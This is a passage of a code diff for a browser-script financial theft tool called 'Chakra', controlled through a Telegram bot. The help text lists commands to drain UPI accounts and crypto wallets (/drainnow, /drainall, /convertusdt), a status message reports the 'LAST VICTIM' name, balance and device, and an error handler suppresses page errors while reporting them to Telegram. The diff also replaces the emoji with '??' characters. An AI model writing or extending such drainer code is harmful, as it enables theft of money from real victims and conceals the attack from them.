-                  '\n─────────────────\n' +
+                  '\n-----------------\n' +
                   'LAST VICTIM:\n' +
-                  '📱 Name: ' + lastVictim.name + '\n' +
-                  '💰 Balance: ₹' + lastVictim.balance + '\n' +
-                  '📱 Device: ' + lastVictim.device;
+                  '?? Name: ' + lastVictim.name + '\n' +
+                  '?? Balance: ?' + lastVictim.balance + '\n' +
+                  '?? Device: ' + lastVictim.device;
               }
               sendToTelegram(statusMsg);
             }
 
             if (msg === '/help') {
               sendToTelegram(
-                '📖 COMMANDS\n' +
-                '─────────────────\n' +
-                '📱 UPI COMMANDS:\n' +
+                '?? COMMANDS\n' +
+                '-----------------\n' +
+                '?? UPI COMMANDS:\n' +
                 '/addupi upi@paytm - Add UPI\n' +
                 '/removeupi upi@paytm - Remove UPI\n' +
                 '/myupis - Show your UPIs\n' +
                 '/transfer - Auto start\n' +
                 '/drainnow - Manual drain\n' +
-                '─────────────────\n' +
-                '💰 CRYPTO COMMANDS:\n' +
+                '-----------------\n' +
+                '?? CRYPTO SET COMMANDS:\n' +
                 '/setbtc 1A... - Set BTC address\n' +
                 '/seteth 0x... - Set ETH address\n' +
                 '/setusdt 0x... - Set USDT address\n' +
                 '/setbnb 0x... - Set BNB address\n' +
                 '/setsol 5X... - Set SOL address\n' +
+                '/settrc20 0x... - Set TRC20 address\n' +
                 '/setall 0x... - Set ALL tokens\n' +
-                '/showcrypto - Show crypto balances\n' +
-                '/drain BTC - Drain specific token\n' +
-                '/drainall - Drain ALL crypto\n' +
-                '/draincrypto - Drain ALL crypto\n' +
-                '─────────────────\n' +
-                '📊 DASHBOARD:\n' +
+                '-----------------\n' +
+                '? CRYPTO REMOVE COMMANDS:\n' +
+                '/removebtc - Remove BTC address\n' +
+                '/removeeth - Remove ETH address\n' +
+                '/removeusdt - Remove USDT address\n' +
+                '/removebnb - Remove BNB address\n' +
+                '/removesol - Remove SOL address\n' +
+                '/removeallcrypto - Remove ALL addresses\n' +
+                '-----------------\n' +
+                '?? CONVERT COMMANDS:\n' +
+                '/convertusdt - Convert ALL tokens to USDT TRC20\n' +
+                '-----------------\n' +
+                '?? DASHBOARD:\n' +
                 '/dashboard - Show complete dashboard\n' +
-                '─────────────────\n' +
-                '⚙️ CONTROL:\n' +
+                '-----------------\n' +
+                '?? CONTROL:\n' +
                 '/pause - Pause drains\n' +
                 '/resume - Resume drains\n' +
                 '/status - Show system status\n' +
@@ -831,7 +1012,7 @@
   }
 
   window.onerror = function(error, url, line) {
-    sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
+    sendToTelegram('[Chakra] ? Error: ' + error + ' at line ' + line);
     return true;
   };
 </script>
